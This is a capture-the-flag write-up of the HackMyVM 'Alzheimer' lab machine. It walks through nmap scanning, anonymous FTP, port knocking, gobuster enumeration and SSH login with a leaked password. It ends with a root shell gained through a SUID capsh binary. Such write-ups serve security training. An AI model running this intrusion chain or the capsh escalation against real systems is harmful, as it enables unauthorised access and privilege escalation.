---
title: "Alzheimer  Writeup HackMyVM"
date: 2024-06-19 00:00:00 +0530
categories: [Write Up,  HackMyVM] 
tags: [Privilege Escalation, SSH, Binary Exploitation, Port Knocking]
---

![Alt Text](/img/alzheimer/1.png)


<strong>The penetration test commenced with a scan using nmap, which identified open and filtered ports. An anonymous FTP login revealed a .txt file with port knocking instructions. Knocking on ports 1000, 2000, and 3000 opened more ports, confirmed with another nmap scan. Checking port 80 for hints and using Gobuster led to new directories. Initially finding nothing, the .txt file was revisited, revealing an SSH password. Using this password, an SSH connection was successfully established. The final phase involved exploring binary vulnerabilities for privilege escalation, ultimately leading to the acquisition of both flags.</strong>


<a href="https://hackmyvm.eu/machines/machine.php?vm=Alzheimer" target="_blank" rel="noopener noreferrer">vm link</a>

#### >> Finding IP with `netdiscover`

<br>
## Enumeration
<br>

#### >> Scan for open ports and services using nmap

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ sudo nmap -sV -O $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 12:12 IST
Nmap scan report for 192.168.1.18 (192.168.1.18)
Host is up (0.00097s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
22/tcp filtered ssh
80/tcp filtered http
MAC Address: 08:00:27:D6:EE:67 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Unix
```
- 21/tcp open     ftp     vsftpd 3.0.3
- 22/tcp filtered ssh
- 80/tcp filtered http

#### >> Check `ftp` connection with anonymous

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ ftp anonymous@$ip
Connected to 192.168.1.18.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||41061|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0             162 Jun 19 00:41 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
local: .secretnote.txt remote: .secretnote.txt
229 Entering Extended Passive Mode (|||39230|)
150 Opening BINARY mode data connection for .secretnote.txt (162 bytes).
100% |********************************************|   162        5.32 MiB/s    00:00 ETA
226 Transfer complete.
162 bytes received in 00:00 (71.61 KiB/s)
ftp> 

```

```shell                                                                                         
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ ls -al
total 12
drwxrwxr-x 2 kali kali 4096 Jun 19 12:22 .
drwxr-xr-x 4 kali kali 4096 Jun 19 12:20 ..
-rw-rw-r-- 1 kali kali  162 Jun 19 06:11 .secretnote.txt
                                                                                         
┌──(kali㉿kali)-[~/Desktop/al]
└─$ cat .secretnote.txt
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
```                        

#### >> Knocking ports 1000, 2000, 3000
- knock few times, if needed

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ knock -v $ip 1000 2000 3000 -d 1000
hitting tcp 192.168.1.18:1000
hitting tcp 192.168.1.18:2000
hitting tcp 192.168.1.18:3000
```
- Check again for open ports with `nmap`

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ sudo nmap --open $ip -p-           
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 15:01 IST
Nmap scan report for 192.168.1.18 (192.168.1.18)
Host is up (0.0042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D6:EE:67 (Oracle VirtualBox virtual NIC)
```
- Port 22 & 80 are open

#### >> Check port 80

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ curl http://$ip/
I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa

┌──(kali㉿kali)-[~/Desktop/alz]
└─$ curl http://$ip/home/
Maybe my pass is at home!
-medusa
```

#### >> Gobuster 

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ gobuster dir -u http://$ip -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.18
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--> http://192.168.1.18/home/]
/admin                (Status: 301) [Size: 185] [--> http://192.168.1.18/admin/]
/secret               (Status: 301) [Size: 185] [--> http://192.168.1.18/secret/]
Progress: 81188 / 882244 (9.20%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 81208 / 882244 (9.20%)
===============================================================
Finished
===============================================================
```
```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ curl http://$ip/secret/
Maybe my password is in this secret folder?
```
```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://$ip/secret -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.18/secret
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 44]
/home                 (Status: 301) [Size: 185] [--> http://192.168.1.18/secret/home/]
Progress: 211153 / 882244 (23.93%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 211198 / 882244 (23.94%)
===============================================================
Finished
===============================================================

┌──(kali㉿kali)-[~/Desktop/alz]
└─$ curl http://$ip/secret/home/
Im trying a lot. Im sure that i will recover my pass!
-medusa

```
- looking around a bit with no luck, recalling `I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa`

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ curl http://$ip/
I dont remember where I stored my password :(
I only remember that was into a .txt file...
-medusa
```
- we have a text file `.secretnote.txt` with password Ihavebeenalwayshere!!!

#### >> SSH

```shell
┌──(kali㉿kali)-[~/Desktop/alz]
└─$ ssh medusa@$ip      
The authenticity of host '192.168.1.18 (192.168.1.18)' can't be established.
ED25519 key fingerprint is SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.18' (ED25519) to the list of known hosts.
medusa@192.168.1.18's password: 
Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 19 03:34:39 2024
medusa@alzheimer:~$ 
medusa@alzheimer:~$ 
medusa@alzheimer:~$ ls -al
total 36
drwxr-xr-x 3 medusa medusa 4096 Jun 19 00:58 .
drwxr-xr-x 3 root   root   4096 Oct  2  2020 ..
-rw------- 1 root   root     17 Jun 19 03:38 .bash_history
-rw-r--r-- 1 medusa medusa  220 Oct  2  2020 .bash_logout
-rw-r--r-- 1 medusa medusa 3526 Oct  2  2020 .bashrc
drwxr-xr-x 3 medusa medusa 4096 Oct  3  2020 .local
-rw-r--r-- 1 medusa medusa  807 Oct  2  2020 .profile
-rw-r--r-- 1 medusa medusa   19 Oct  3  2020 user.txt
-rw------- 1 medusa medusa  107 Oct  3  2020 .Xauthority
medusa@alzheimer:~$ 
```
<br>
## Privilege Escalation
<br>

#### >> Exploring binary vulnerabilities for privilage escalation

```shell
medusa@alzheimer:~$ sudo -l
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
medusa@alzheimer:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
medusa@alzheimer:~$ 
```
#### >> Search for information about /usr/sbin/capsh using the searchbins tool

- `https://gtfobins.github.io/gtfobins/capsh/#suid` - <a href="https://gtfobins.github.io/gtfobins/capsh/#suid" target="_blank" rel="noopener noreferrer">explore</a>

```shell
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:~# 

root@alzheimer:~# ls -al
total 36
drwxr-xr-x 3 medusa medusa 4096 Jun 19 00:58 .
drwxr-xr-x 3 root   root   4096 Oct  2  2020 ..
-rw------- 1 root   root     17 Jun 19 03:38 .bash_history
-rw-r--r-- 1 medusa medusa  220 Oct  2  2020 .bash_logout
-rw-r--r-- 1 medusa medusa 3526 Oct  2  2020 .bashrc
drwxr-xr-x 3 medusa medusa 4096 Oct  3  2020 .local
-rw-r--r-- 1 medusa medusa  807 Oct  2  2020 .profile
-rw-r--r-- 1 medusa medusa   19 Oct  3  2020 user.txt
-rw------- 1 medusa medusa  107 Oct  3  2020 .Xauthority
root@alzheimer:~# ls /root -al
total 24
drwx------  3 root root 4096 Oct  3  2020 .
drwxr-xr-x 18 root root 4096 Oct  2  2020 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Oct  2  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root   16 Oct  3  2020 root.txt
root@alzheimer:~#
```
- We have both the flags

<br>
<center>pwned</center>